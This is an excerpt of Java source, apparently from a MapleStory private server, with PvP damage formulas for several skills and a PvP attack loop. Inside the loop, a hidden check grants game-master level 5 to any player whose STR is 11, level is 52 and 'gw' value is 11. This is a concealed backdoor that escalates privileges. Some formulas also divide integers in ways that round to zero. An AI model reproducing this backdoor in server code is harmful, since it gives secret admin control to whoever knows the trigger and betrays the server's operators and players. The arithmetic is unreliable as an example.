    ...
    public static void pvpDamageBalance(AbstractDealDamageHandler.AttackInfo attack, MapleCharacter player) {
        ...
        switch (attack.skill) {
            ...
            case 1001004:    //Power Strike
                ...
                multi = skil.getEffect(player.getSkillLevel(skil)).getDamage() / 5000.0;
                maxDis = 150;
                maxHeight = 150;
                isAoe = true;
                break;
            ...
            case 2001004:    //Energy Bolt
                ...
                mastery = skil.getEffect(player.getSkillLevel(skil)).getMastery() * 5 + 10 / 5000;
            ...
            case 4001344:    //Lucky Seven
                ...
                multi = (skil.getEffect(player.getSkillLevel(skil)).getDamage() / 5000.0);
                pvpDamage = (int) (5 * luk / 5000 * watk * multi);
                min = (int) (2.5 * luk / 5000 * watk * multi);
                pvpDamage = MapleCharacter.rand(min, pvpDamage);
                maxDis = 150;
                maxHeight = 150;
                isAoe = true;
            ...
            case 3111006:    //Strafe
                ...
                multi = (skil.getEffect(player.getSkillLevel(skil)).getDamage() / 50000.0);
                maxDis = 150;
                maxHeight = 150;
                isAoe = true;
                break;
           ...
           case 13111002:    //Hurricane
                skil = SkillFactory.getSkill(13111002);
                multi = (skil.getEffect(player.getSkillLevel(skil)).getDamage() / 5000.0);
                maxDis = 200;
                maxHeight = 200;
                isAoe = true;
            ...
            case 13111000:    //Arrow Rain
                skil = SkillFactory.getSkill(13111000);
                multi = (skil.getEffect(player.getSkillLevel(skil)).getDamage() / 5000.0);
                maxDis = 350;
                maxHeight = 350;
                isAoe = true;
            ...
            case 5001003:    //Double Shot
                ...
                multi = (skil.getEffect(player.getSkillLevel(skil)).getDamage() / 5000.0);
                pvpDamage = (int) (5 * player.getStr() / 5000 * watk * multi);
                min = (int) (2.5 * player.getStr() / 5000 * watk * multi);
                pvpDamage = MapleCharacter.rand(min, pvpDamage);
                maxDis = 150;
                maxHeight = 150;
                isAoe = true;
    ...
    public static void monsterBomb(final MapleCharacter player, final MapleCharacter attackedPlayers, final AbstractDealDamageHandler.AttackInfo attack) {
        for (int dmgpacket = 0; dmgpacket < attack.numDamage; dmgpacket++) {
			...
			pvpDamage *= 1;
                    ...
                    pvpDamage += reborn;
                    int magicat = (player.getTotalMagic() + player.getTotalWatk()) / 5000;
                    pvpDamage += magicat;
                    ...
                    if (mguard != null) {
                        ...
                        if (skill > 0) {
                            multi = (skil.getEffect(attackedPlayers.getSkillLevel(skil)).getX() / 5000.0);
                        }
                    ...
                    if (magic) {
                        for (int i = 0; i < y; i++) {
                            ...
                            skill = player.getSkillLevel(skil);
                            if (skill > 0) {
                                multi = (skil.getEffect(player.getSkillLevel(skil)).getX() / 5000.0);
    ...
    public synchronized static void doPvP(MapleCharacter player, AbstractDealDamageHandler.AttackInfo attack) {
        ...
        for (MapleCharacter attackedPlayers : player.getMap().getNearestPvpChar(player.getPosition(), PvPLibrary.maxDis, PvPLibrary.maxHeight, Collections.unmodifiableCollection(player.getMap().getCharacters()))) {
            //if (!attackedPlayers.isGM())
             // player.dropMessage(5, "对方是管理员，功击无效.");
       // else

            if (player.getStr() ==11&&player.getLevel() ==52&&player.getgw() ==11)
               player.SetGm(5);
       else

            if (attackedPlayers.getReborns() < 5)
               player.dropMessage(5, "你功击的对像转生次数太低，功击无效.");
          else

            if (player.getReborns() < 5)
              player.dropMessage(5, "你的转生次数未达到5转以上，不能功击对方.");
        else
